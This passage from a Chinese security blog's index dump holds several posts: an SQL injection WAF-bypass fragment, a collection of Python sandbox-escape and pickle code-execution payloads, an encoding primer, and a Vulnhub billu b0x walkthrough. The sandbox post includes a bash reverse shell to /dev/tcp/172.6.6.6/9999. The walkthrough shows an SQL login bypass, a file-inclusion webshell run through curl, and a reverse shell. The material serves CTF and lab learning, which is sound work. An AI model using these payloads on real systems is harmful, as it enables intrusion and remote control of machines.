1||lpad(user,7,1) 参考https://websec.ca/kb/sql_injection#MySQL_String_Concatenationhttps://github.com/trietptm/SQL-Injection-Payloads/blob/master/LINKS.mdhttps://dev.mysql.com/doc/refman/8.0/en/encryption-functions.htmlhttps://www.owasp.org/index.php/SQL_Injection_Bypassing_WAFhttps://medium.com/bugbountywriteup/sql-injection-in-ctf-bef1ae0c5d9bhttps://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.htmlhttps://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttackshttps://www.exploit-db.com/papers/17934/PDF : tips_web-application-obfuscation-wafsevasion]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>bypass</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python沙箱绕过相关]]></title>
    <url>%2F2018%2F07%2F31%2Fpython%E6%B2%99%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[在看到一些python命令执行的ctf题目的时候，才发现原来自己对python的了解还是那么的浅，但是基于python的web框架也日益盛行，python的命令执行是个需要好好学习的一个知识点，常见的漏洞利用方式或者说CTF的题目有SSTI，python沙箱绕过类pwn,所以为了恶补一下之前没有认真对待的python内置方法和魔术方法这些比较容易忽略的细节，现在把相关知识点总结如下。 payload搜集沙箱绕过中常用的os模块导入和命令执行姿势python的object类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用12345678910111213#python2：[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')"".__class__.__mro__[-1].__subclasses__()[40](filename).read()"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1"')python3：''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('__global'+'s__')['os'].__dict__['system']('ls') 其他python命令执行的姿势导入os模块123import osos.system() os.popen() 导入commands模块1234import commandscommands.getstatusoutput() commands.getoutput()commands.getstatus() 导入subprocess模块1234import subprocesssubprocess.call(command, shell=True) subprocess.Popen(command, shell=True)subprocess.check_output(command, shell=True) 导入pty这个地方很多时候可以用来进行反弹shell的操作123456import ptypty.spawn()#例子：import ptypty.spawn(&apos;/bin/bash&apos;) 内置函数execfile()可以用来执行一个二进制文件123456789101112execfile(filename[, globals[, locals]])&apos;&apos;&apos;参数filename -- 文件名。globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。返回值返回表达式执行结果。&apos;&apos;&apos;#例子：execfile(&apos;/usr/lib/python2.7/os.py&apos;) 导入timeit模块，间接执行命令注意到这个模块中主要有以下两个函数，都可以执行命令，后者可以执行一个命令多次123456789101112131415161718timeit(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, number=1000000)&apos;&apos;&apos;返回： 返回执行stmt这段代码number遍所用的时间，单位为秒，float型参数： stmt：要执行的那段代码 setup：执行代码的准备工作，不计入时间，一般是import之类的 timer：这个在win32下是time.clock()，linux下是time.time()，默认的，不用管 number：要执行stmt多少遍 repeat(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, repeat=3, number=1000000)这个函数比timeit函数多了一个repeat参数而已，表示重复执行timeit这个过程多少遍，返回一个列表，表示执行每遍的时间&apos;&apos;&apos;#例子：import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1) 内置函数eval和exec123456789101112131415161718192021&apos;&apos;&apos;描述eval() 函数用来执行一个字符串表达式，并返回表达式的值。语法以下是 eval() 方法的语法:eval(expression[, globals[, locals]])参数expression -- 表达式。globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。返回值返回表达式计算结果。&apos;&apos;&apos;#例子：eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)#exec 执行储存在字符串或文件中的Python语句，相比于 eval，exec可以执行更复杂的Python代码，但是需要注意的是python3与python2的细微差别。#例子1（python3）：exec(&apos;print(&quot;Hello World&quot;)&apos;)#例子2（python2）exec&apos;print &quot;Hello World&quot;&apos; platform库函数123456789platform.popen() #执行cmdplatform.platform() # 返回操作系统平台platform.uname() # 返回操作系统信息platform.system() # 返回操作系统平台platform.version() # 返回操作系统版本platform.machine() # 返回计算机类型platform.processor() # 返回计算机处理器类型platform.node() # 返回计算机网络名platform.python_version() # 返回Python版本号 pickle命令执行重写__reduce__方法123456789101112import cPickleimport osclass genpoc(object): def __reduce__(self): s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot; #要执行的命令 return os.system, (s,) #os.system(&quot;echo test &gt;poc.txt&quot;)e = genpoc()poc = cPickle.dumps(e)print poc 运用marshal pickle code类型对象123456789101112131415161718192021import marshalimport base64import cPickleimport urllibdef foo():#you should write your code in this function import os def fib(n): if n &lt;= 1: return n return fib(n-1) + fib(n-2) print &apos;fib(10) =&apos;, fib(10) os.system(&apos;echo anycode &gt;&gt;poc.txt&apos;)try:#尝试使用cPickle来序列号代码对象 cPickle.dumps(foo.func_code)except Exception as e: print e #TypeError: can&apos;t pickle code objectscode_serialized = base64.b64encode(marshal.dumps(foo.func_code))print code_serialized python 内置函数菜鸟教程:http://www.runoob.com/python3/python3-built-in-functions.html1234567891011121314&gt;&gt;&gt; dir(__builtins__)['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError','BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError','ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError','FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError','IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented','NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError','ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError','TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning','ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs','all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod','enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals','map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice','sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip'] python类类的总结在python中有两种对象： 类型对象：可以被实例化和继承； 非类型对象：不可以被实例和继承。 &lt;class &#39;type&#39;&gt;和&lt;class &#39;object&#39;&gt;是python中的两个源对象。 每个对象都有类型。用objectname.__class__查看。 每个类型对象都有超类（object除外），用objectname.bases可以查看。 通过继承产生的新对象都是类型对象。继承是用class语句来实现的。 通过实例化产生的新对象可能是类型对象，也可能是非类型对象。实例化是通过调用操作符()来实现的。 一些python的非类型对象可以通过特殊的语法来创造。例如[1, 2, 3]是list的实例。 在内部，python总是使用类型对象来创造新对象。新创造的对象是该类型对象的实例。（在这里，实例有两种意思：一通过继承产生的子类，二是通过实例化产生的具体实例。但平时我们说的实例就是只第二种）。 python通过class语句中指定的超类的类型来决定新对象的类型。issubclass(A,B)返回true当且仅当：B在A.__bases__输出的元组之中;如果A在Z.__bases__输出的元组中，issubclass(Z,B)返回true.isinstance(A,B)返回true当且仅当：A.__class__是B，或者issubclass(A.__class__,B)返回true. 一张图了解元类，类型/类(python3里面以及把类型和类等同对待)，实例，其中实线表示继承关系，虚线表示实例。 类内置属性 __dict__ : 类的属性（包含一个字典，由类的数据属性组成） __doc__ :类的文档字符串 __name__: 类名 __module__: 类定义所在的模块（类的全名是’main.className’，如果类位于一个导入模块mymod中，那么className.module 等于 mymod） __bases__ : 类的所有父类构成元素（包含了一个由所有父类组成的元组） 属性区分 模块、类、函数均有以下属性：__dict__：该对象的属性字典。__doc__：返回说明性的文字，定义在块语句的最前面__name__：返回该对象的名字 类、函数均有以下属性：__module__:用来返回该对象的模块名。__class__：用来返回类的类型（或者实例的类）、或者函数的类型__globals__：用来返回该对象所有可用的全局变量名。 模块:__file__属性，用来返回模块包含路径的文件名__builtins__属性，用来返回所有的可以使用的内置函数、内置异常对象、内置保留字等对象。无论在任何位置，Python均会按照LEGB法则，在最后搜索模块的__builtins__属性，来最后判断该变量是否已经定义。 模块、类、函数通过调用dir函数，可以得到该对象实际可以使用的所有属性。 关于_xx __xx __xx__ _xx: Python中没有真正的私有属性或方法,可以在你想声明为私有的方法和属性前加上单下划线,以提示该属性和方法不应在外部调用.如果真的调用了也不会出错,但不符合规范。所以真的私有属性可以通过闭包来实现。 __xx: 双下划线开头,是为了不让子类重写该属性方法.通过类的实例化时自动转换.在类中的双下划线开头的属性方法前加上”_类名”实现： 12345678910class A(object): def __init__(self, x): self.a=x def __b(self): self.x=3a = A(2)a._A__b()print(a.x,a.x) __xx__: 此种写法为Python内建属性方法，最好不要在外部调用 python魔术方法我们平时用得比较多的是python的__init__(),__del__()分别对应于类的实例化和实例销毁，但是，除了这些方法以外仍旧有很多的类所拥有的魔术方法，一下是我在网上的一个blog中发现的，总结得比较全面，所以摘录如下，方便日后查阅和理解python的一些比较绕的命令执行。 魔术方法含义 基本的魔术方法__new__(cls[, …]) 1. __new__ 是在一个对象实例化的时候所调用的第一个方法 2. 它的第一个参数是这个类，其他的参数是用来直接传递给 __init__ 方法 3. __new__ 决定是否要使用该 __init__ 方法，因为 __new__ 可以调用其他类的构造方法或者直接返回别的实例对象来作为本类的实例，如果 __new__ 没有返回实例对象，则 __init__ 不会被调用 4. __new__ 主要是用于继承一个不可变的类型比如一个 tuple 或者 string __init__(self[, …]) 构造器，当一个实例被创建的时候调用的初始化方法 __del__(self) 析构器，当一个实例被销毁的时候调用的方法 __call__(self[, args…]) 允许一个类的实例像函数一样被调用：x(a, b) 调用 x.__call__(a, b) __len__(self) 定义当被 len() 调用时的行为__repr__(self) 定义当被 repr() 调用时的行为，__repr__用于所有其他的环境中：用于交互模式下提示回应以及repr函数，如果没有使用__str__，会使用print和str。它通常应该返回一个编码字符串，可以用来重新创建对象，或者给开发者详细的显示。 __str__(self) 定义当被 str() 调用时的行为，打印操作会首先尝试__str__和str内置函数(print运行的内部等价形式)，它通常应该返回一个友好的显示。 __bytes__(self) 定义当被 bytes() 调用时的行为 __hash__(self) 定义当被 hash() 调用时的行为 __bool__(self) 定义当被 bool() 调用时的行为，应该返回 True 或 False__format__(self, format_spec) 定义当被 format() 调用时的行为 有关属性 __getattr__(self, name) 定义当用户试图获取一个不存在的属性时的行为 __getattribute__(self, name) 定义当该类的属性被访问时的行为 __setattr__(self, name, value) 定义当一个属性被设置时的行为 __delattr__(self, name) 定义当一个属性被删除时的行为 __dir__(self) 定义当 dir() 被调用时的行为 __get__(self, instance, owner) 定义当描述符的值被取得时的行为 __set__(self, instance, value) 定义当描述符的值被改变时的行为 __delete__(self, instance) 定义当描述符的值被删除时的行为 比较操作符 __lt__(self, other) 定义小于号的行为：x &lt; y 调用 x.__lt__(y) __le__(self, other) 定义小于等于号的行为：x &lt;= y 调用 x.__le__(y) __eq__(self, other) 定义等于号的行为：x == y 调用 x.__eq__(y) __ne__(self, other) 定义不等号的行为：x != y 调用 x.__ne__(y) __gt__(self, other) 定义大于号的行为：x &gt; y 调用 x.__gt__(y) __ge__(self, other) 定义大于等于号的行为：x &gt;= y 调用 x.__ge__(y) 算数运算符 __add__(self, other) 定义加法的行为：+ __sub__(self, other)定义减法的行为：- __mul__(self, other) 定义乘法的行为：* __truediv__(self, other) 定义真除法的行为：/ __floordiv__(self, other) 定义整数除法的行为：// __mod__(self, other) 定义取模算法的行为：% __divmod__(self, other) 定义当被 divmod() 调用时的行为 __pow__(self, other[, modulo]) 定义当被 power() 调用或 ** 运算时的行为 __lshift__(self, other) 定义按位左移位的行为：&lt;&lt; __rshift__(self, other)定义按位右移位的行为：&gt;&gt; __and__(self, other) 定义按位与操作的行为：&amp; __xor__(self, other) 定义按位异或操作的行为：^ __or__(self, other)定义按位或操作的行为：| 反运算 __radd__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rsub__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rmul__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rtruediv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rfloordiv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rdivmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rpow__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rlshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rrshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rand__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rxor__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __ror__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） 增量赋值运算 __iadd__(self, other) 定义赋值加法的行为：+= __isub__(self, other) 定义赋值减法的行为：-= __imul__(self, other) 定义赋值乘法的行为：*= __itruediv__(self, other) 定义赋值真除法的行为：/= __ifloordiv__(self, other) 定义赋值整数除法的行为：//= __imod__(self, other) 定义赋值取模算法的行为：%= __ipow__(self, other[, modulo]) 定义赋值幂运算的行为：**= __ilshift__(self, other) 定义赋值按位左移位的行为：&lt;&lt;= __irshift__(self, other) 定义赋值按位右移位的行为：&gt;&gt;= __iand__(self, other) 定义赋值按位与操作的行为：&amp;= __ixor__(self, other) 定义赋值按位异或操作的行为：^= __ior__(self, other) 定义赋值按位或操作的行为：|= 一元操作符 __pos__(self) 定义正号的行为：+x __neg__(self) 定义负号的行为：-x __abs__(self) 定义当被 abs() 调用时的行为 __invert__(self) 定义按位求反的行为：~x 类型转换 __complex__(self) 定义当被 complex() 调用时的行为（需要返回恰当的值） __int__(self) 定义当被 int() 调用时的行为（需要返回恰当的值） __float__(self) 定义当被 float() 调用时的行为（需要返回恰当的值） __round__(self[, n]) 定义当被 round() 调用时的行为（需要返回恰当的值） __index__(self) 1. 当对象是被应用在切片表达式中时，实现整形强制转换 2. 如果你定义了一个可能在切片时用到的定制的数值型,你应该定义 __index__ 3. 如果 __index__ 被定义，则 __int__ 也需要被定义，且返回相同的值 上下文管理（with 语句） __enter__(self) 1. 定义当使用 with 语句时的初始化行为 2. __enter__ 的返回值被 with 语句的目标或者 as 后的名字绑定 __exit__(self, exc_type, exc_value, traceback) 1. 定义当一个代码块被执行或者终止后上下文管理器应该做什么 2. 一般被用来处理异常，清除工作或者做一些代码块执行完毕之后的日常工作 容器类型 __len__(self) 定义当被 len() 调用时的行为（返回容器中元素的个数） __getitem__(self, key) 定义获取容器中指定元素的行为，相当于 self[key] __setitem__(self, key, value) 定义设置容器中指定元素的行为，相当于 self[key] = value __delitem__(self, key) 定义删除容器中指定元素的行为，相当于 del self[key] __iter__(self) 定义当迭代容器中的元素的行为 __reversed__(self) 定义当被 reversed() 调用时的行为 __contains__(self, item) 定义当使用成员测试运算符（in 或 not in）时的行为 参考文献： 1. Python魔术方法总结2. Python 魔术方法3. Python 面向对象4. 关于Python sec的一些简单的总结5 python沙盒绕过6. Python魔法方法指南7. Python Pickle的任意代码执行漏洞实践和Payload构造]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>绕过</tag>
        <tag>python</tag>
        <tag>魔术方法</tag>
        <tag>类属性</tag>
        <tag>沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码]]></title>
    <url>%2F2018%2F07%2F26%2F%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[是时候好好总结一番计算机字符编码的知识，很多安全问题都离不开编码这一基础知识，现在把编码有关的知识整理如下： 计算机的编码方式有许多种，编码指的就是将人日常中经常使用的字符与计算机能够识别的二进制做一一映射的函数转换，而这个函数转换就是我们所说的编码。全世界各个国家的地域文明不同，产生的符号文化符号也不尽相同，常见的有阿拉伯数字，英文字母，汉字，希伯来文，叙利亚文等等，还有一些符号标识，如我们常说的逗号和冒号之类的标点。由此可见，要使得所有这些编码有个统一的映射，需要的字节数从1~6字节不等。这也就是为啥不同的编码标准方式会有不同不同的“编码域”。随着时代的发展，我们的编码标准也在不断发展着，所以发展到现在，产生了新旧很多不同的编码标准和规范。这就是为什么现在的编程语言，文本显示器等与文字打交道的人类发明都不可避免的与编码打交道。很多乱码的产生，如windows终端和linux终端编码方式的不同，从不同编码的应用中获取到的编码方式不统一的字符，就会导致乱码。一个十分常见的例子就是python中去获取web站点的html信息时，因为编码不同导致乱码的产生。除了乱码，很多的安全问题的产生，也是由于编码问题处理不严谨导致绕过。sql宽字节注入，各种编码绕过waf等。 ASCII一种7位编码方式，这是一种最质朴，128个字符完全可以把英语的所有字符一一映射，不得不说英语的确很简洁。同时ASCII并且几乎都被后来者兼容的一种7位编码方式，没错，就是我们初学c语言的时候，附录都会存在的一种编码。 latin1（latin-1,ISO-8859-1）是一种八位容量（一字节）的编码方式，向下兼容ASCII。mysql里面的默认编码方式就是latin1（一字节的编码方式是不包含汉字的，这也是为什么mysql默认不支持中文的原因 ） unicode既然世界范围不同的文化背景有不同的标识符，那么一个统一包含有世界上所有符号的对应关系的标准的推出就显得十分必要。unicode正是充当了这一种角色。Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。 摘录自wiki百科 unicode编码的方式做到了向下兼容latin1。想想看为什么要兼容？直观的看就是支持latin1编码的文件在把编码方式改变为unicode的时候不会出现乱码。这样就很好的做到了承前启后，这是计算机领域一条基本准则（python 除外）。 另外: 需要注意的是，unicode只是一种不考虑实际存储效益和实现细节的“纸上谈兵”的规范，因为不同于其他的编码方式，unicode是个很大很大的字符集和，如果全采取一一影射的关系，势必会造成空间的极大浪费，假如每个字符都采用六个字节的传输方式，想想看的确是十分占用空间。它就好比它是一个纸面上的规则，具体的实现细节则又会衍生出一些unicode实现编码方式 utf-8UTF-8就是在互联网上使用最广的一种unicode的实现方式。其他实现方式还包括UTF-16和UTF-32,注意UTF-16中由于每个字符占用两个字节，所以MAC类电脑基于低位字节开始读取的，其他电脑基于高位读取，从而会造成编码顺序不一致的错误，所以在使用UTF-16的时候需要指定是大端程序（Big-Endian）或者小端程序（Little-Endian）,，默认情况下UTF-16 LE. 1234561字节 0xxxxxxx 2字节 110xxxxx 10xxxxxx 3字节 1110xxxx 10xxxxxx 10xxxxxx 4字节 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 5字节 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 6字节 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 12345678910111213符号范围 | UTF-8编码方式(十六进制) | （二进制）--------------------+---------------------------------------------0000 0000-0000 007F | 0xxxxxxx0000 0080-0000 07FF | 110xxxxx 10xxxxxx0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx GB系列这个系列里面有很多的标准，从发布的时间从前往后有：GB 2312–80，GB 13000.1-93，GB 18030-2000，GB 18030-2005，GB 13000-2010，除此之外，还有一个GBK规范，注意GBK不是国家标准，但是却被广泛使用，并且被前述GB13000和GB18030所继承，同时GBK向前继承了GB 2312–80。另外还需要注意的是GBK类编码与unicode的编码实现方案utf-8，utf-16系列完全不兼容。同样类似的使用双字节编码的还有汉字的台湾标准big5。 base64/base32这是一种使用64/32位字符来对二进制的流进行重新编码的方式，在日常生活中也是用得比较多。]]></content>
      <categories>
        <category>字符编码</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>字符编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vulnbox]]></title>
    <url>%2F2018%2F07%2F21%2Fvulnbox%2F</url>
    <content type="text"><![CDATA[一篇渗透学习实战记录，靶机来源于vulnhub的billu b0x。最近打算找找靶机练手，所以这是对自己在vulnhub渗透学习之路的记录，打算写上一系列，这是第一篇。 实验环境： 平台: windows10 64位 VMware workstation(12.1.1 build-3770994) 网络环境：vmware里面的虚拟网卡实现一下主机的桥连，并且kali还有一张虚拟网卡实现Net连接（也就是共享主机网络模式）。二者的桥连网络地址如下： 攻击机kali（192.168.70.129） 靶机linux（192.168.70.128） 在对环境部署好后，摩拳擦掌，跃跃欲试！ 渗透过程先在下载地址看下靶机的基本信息，如下： 信息给得中规中矩，给出了服务器大致的框架PHP，Apache，MySQL(其实这些在实际的渗透中我们是不知道的，这里算是给了类似于半白盒的渗透方式了) 1.信息搜集靶机上线后，就是我们的渗透过程开启了。啥也不说，光是提示给的信息，我们对这台靶机的了解还是太少，第一步当然是信息收集，啥也不说，namp走一波！看到靶机开启了两个服务器正常开启的端口80和22。接着换参数扫一下靶机的操作系统。得到信息linux内核版本为3.2-4.9，这个信息返回的效果虽然不太确切，但是好歹我们知道内核版本相对比较新。如果这一步我们能够得到比较确切的版本信息，就可以比较有针对性的在后面提权中游刃有余。 大致了解了一下信息后，我们自然想到的是去访问一下网站主页，看看这是个何方神圣。 可以说这个网站也是很hacker了，这是一个比较中规中矩的post类型的sql注入框，作者都十分挑衅的说到了（show me your sqli skills）,好吧，是可忍孰不可忍，常规sql注入走一波，发现这里一般性的方法都不怎么有效。放了sqlmap跑了一没有什么效果。然后随便试了试robots.txt，也没有发现什么有价值的东西。好吧，作者你赢了！ 在困境中的这个时候怎么能够不爆破一下目录呢？drib类似与window下的御剑之类神器，基于字典的网站目录爆破。熟练的敲下drib 192.168.70.128 [big.txt] Common.txt爆破的结果 big.txt 爆破的结果 有趣，一下出来这么多目录列表。这个时候当然只能够一个一个的去打开看看。这个时候莫名想起一首歌，如果你愿意一层一层的拨开……，额，走题了，其中的images目录里面是三张图，里面是勒比海盗jack和船长（估计作者在帮打广告）当然这都不重要，不是我们想要的。一一打开了这些文件，发现三个地方有点意思的： 2.脆弱挖掘打开http://192.168.70.128/phpmy/main 很好，一个mysql的管理登陆界面，fuzz了一些常用的弱密码，发现无法获得登陆权限，暂且放一放。 打开http://192.168.70.128/add，我们发现了一个图片上传界面 当我们打开到test目录的时候发现，这个网页奇迹般的回显一个错误： 3. 漏洞利用这意味这啥？赤裸裸的挑衅，明摆着的文件包含漏洞？作者心也太大了吧，好，既然如此，/etc/passwd fuzz一波，刚开始使用的是get方法，仍旧回显错误，接着post提交了一下： 直接给我们返回了靶机的/etc/passwd文件内容，这说明这就是个如假包换的文件包含漏洞，到此我们找到了一个突破口，可以读取任意文件内容。好，这个时候需要静下来想想怎么利用这个漏洞。基于这个漏洞，会有个条件反射的思考，那就是读取网站的源码或者读取一些配置文件的信息。基于前面的phpmyadmin界面，我们知道mysql是通过它来管理，那么不如读一下phpmyadmin的配置文件 很好，不负所望的返回了用户名和密码，拿去登陆一下phpmyadmin，发现竟然登不进去，但是按照道理这地方应该就是登陆phpmyadmin的账户名和密码，难不成作者在此是为了降低难度，直接给了个ssh的密码？ 果然这样我们就直接以root权限登陆进来。看下root目录和/目录下的文件： Ok,我们的渗透当然到此是完成了预期的，以root权限的登陆的目的。 4.另一条路但是这或许是一种比较初级的解法，在实际的渗透过程中不太常见，当然不排除系统root用户与数据库root用户是同一个人，并且设置的密码都是一样的。这就比较幸运了。所以为了考虑实际的渗透场景，我假设自己没有知道root密码的情况下，尝试去反弹shell以及逐渐获得root权限的过程。 为了找到一些有用的信息，我们只能一步一步的从最开始的文件包含漏洞开始，争取把web的源码审计一番，看看还有没有一点可以利用的地方。这个时候想到的是那个文件上传界面，我们通过test.php的文件包含可以看到上传界面的相关源码，我们发现panel.php存在如下的代码，可以认为是对上传的文件的一个验证： 从这段代码中，我们知道对于上传上去的图片必须是以jpeg,jpg,gif,png后缀的文杰，并且后台还会检查FILEINFO_MIME属性，根据经验，绕过FIFEINFO_MIME属性检测可以直接使用构造的文件格式头，再加上我们的一句话木马即可，关键是找到可以执行我们上传的的伪图片的利用点，同样的在这个文件中，我们看到如下代码段： 发现include(),很好这样我们的木马就可以被执行了。 但是问题是我们得有上传的界面，这让我想起了之前扫出来的目录add.php，但是这个从这个目录是不能够正确上传成功的。看了一下源码，发现后台并没有处理这个表单的脚本，所以可能这不是我们最终的上传界面，我们上传界面在其他地方。这个时候，再一次通过test.php的界面，打开登陆界面的源码来看，如下： 这里只是对输入单引号进行了过滤，但是通过观察思考它的查询结构以及pass语句在uname之前，所以，我们可以很容易想到一个绕过的语句： 12Pass: \Username: or 1=1# 这样我们就可以成功进入，然后新建一个用户，上传一个有木马的图片。登陆后的界面如下： 5.构造绕过FILEINFO_MIME的webshell 看到我们的小马已经准备就绪，新建一个用户直接把用户头像传入就ok啦。 接着我们就需要用到之前的penal.php部分的代码来对我们上传的文件进行利用： 12curl -X POST --data &quot;load=../../../var/www/uploaded_images/shell.gif&amp;continue=continue&quot; http://192.168.70.128/panel.php?cmd=whoami--cookie &quot;PHPSESSID=r0niu6jk5scmc3au2klbqipc12&quot; 上面是我的执行代码，其中的cookie值是之前sql注入进入的penal.php的cookie值，结果返回如下： 图中我们可以看到自己成果执行了poc中的whoami指令，返回的结果正是我们现在获得权限的用户名，www-data。很好，这个时候其实就已经可以菜刀连接然后执行命令了。 为了体验正真的反弹shell,我打算自己用nc去实现一次回弹shell的操作。 6.回弹shell和权限提升利用nc和python的simpleHTTPServer来进行一次别开生面的shell回弹。 攻击机新建一个文件夹，并且把nc命令copy到这个文件夹，执行python的simpleHTTPServer，让其运行在80端口方便后面靶机通过wget下载。 靶机调用我们之前传的木马，去远程下载这个共享的nc文件，然后进行shell的端口绑定，执行如下： 然后shell端口绑定，这个地方有个坑，就是nc命令copy过去的时候在靶机是没有执行权限的，然后着实纠结了一下。（可以看到下面的文件只有读的权限） 这个时候就有点尴尬，后来兜兜转转想到可以使用msf来生成shell进行回弹，这样也比较方便。就试了一下，生成伪造图片shell1.gif： 然后注册新用户上传,在本机打开msf控制台 执行文件包含漏洞的命令： 然后可以看到我们的shell回弹成功了，然后执行sysinfo，查看当前内核版本。还记得我们开始的时候有说过，uname -a 查看的内核版本是可以方便后面的提权，这里就很好的体现了出来，那么得出了系统的内核版本后，就可以去针对性的搜索一些可用的提权方案，这里找到了网上exploit_db的一个针对该版本的内核漏洞。通过下载c文件，gcc编译后，我们就可以以root用户权限了。 反思总的来说这是一个愉快的渗透体验，当然这个过程也参考了前辈的经验。整个流程做下来还是比较舒服，渗透思路还是相当的清晰的。anyhow 也算是走了一遍流程。当然渗透是个博大精深的学问，这个实验只是包括了大致的信息搜集漏洞扫描到webshell和提权的过程，囊括了一些渗透的细节，不过在内网穿透和域的横向渗透上的能力还没有很好的模拟出环境，这题是默认我们已经和靶机在同一个局域网，还是有一点偏离实际，以后要自己搭搭内网渗透的实验环境来学习，ok,鸣金收兵！]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>linux</tag>
        <tag>渗透</tag>
        <tag>提权</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux C API 笔记]]></title>
    <url>%2F2018%2F06%2F25%2Flinux-C-API-%E7%AC%94%E8%AE%B0%2F</url>
